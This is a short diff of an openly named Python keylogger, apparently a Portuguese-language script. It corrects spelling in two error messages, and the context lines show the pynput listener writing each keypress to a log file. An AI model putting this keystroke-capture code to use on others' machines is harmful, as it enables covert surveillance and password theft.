@@ -10,7 +10,7 @@ def escrita_keylogger(key):
             with open(log, 'a') as file:
                 file.write(f'{str(key)} \n ')
         except Exception as e:
-            print(f'erro ao capiturar digito{e} ')
+            print(f'erro ao capturar digito{e} ')
             encerrar_keylogger()
         if key == key.esc:
                 encerrar_keylogger()
@@ -21,7 +21,7 @@ with Listener(on_press=escrita_keylogger) as log:
         try:
             log.join()
         except Exception as e:
-            print('Erro durante a capitura de tecla')
+            print('Erro durante a captura de tecla')
         finally:
             log.stop()
             encerrar_keylogger()
